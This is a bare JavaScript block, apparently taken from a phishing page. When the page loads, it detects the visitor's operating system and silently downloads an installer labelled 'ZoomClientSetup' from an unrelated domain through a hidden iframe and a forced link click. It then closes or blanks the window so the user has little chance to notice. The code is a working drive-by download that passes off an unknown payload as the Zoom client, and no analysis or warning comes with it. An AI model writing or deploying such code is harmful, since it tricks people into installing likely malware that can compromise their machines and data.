<script>
    function detectOS() {
        const platform = navigator.platform.toLowerCase();
        const userAgent = navigator.userAgent.toLowerCase();

        if (platform.includes('win') || userAgent.includes('windows')) 
            return 'windows';
        if (platform.includes('mac') || userAgent.includes('macintosh')) 
            return 'macos';
        if (platform.includes('linux') || userAgent.includes('linux')) 
            return 'linux';

        return 'windows';
    }

    function getDownloadLink(os) {
        const baseUrl = 'https://arjairsparts.com/zoomsetup/clientsetup/ZoomClientSetup';
        const query = '?e=Access&y=Guest';
        
        return {
            'windows': baseUrl + '.exe' + query,
            'macos': baseUrl + '.pkg' + query,
            'linux': baseUrl + '.sh' + query
        }[os] || baseUrl + '.exe' + query;
    }

    function triggerDownload() {
        const os = detectOS();
        const url = getDownloadLink(os);
        
        // Create hidden iframe for more reliable download triggering
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = url;
        document.body.appendChild(iframe);
        
        // Alternative method using anchor click
        const link = document.createElement('a');
        link.href = url;
        link.download = '';
        document.body.appendChild(link);
        link.click();
        
        // Close window after short delay
        setTimeout(() => {
            try {
                window.close();
            } catch(e) {
                // If window can't be closed, at least attempt to redirect
                window.location.href = 'about:blank';
            }
        }, 500);
    }

    // Start download immediately
    window.addEventListener('DOMContentLoaded', triggerDownload);
</script>
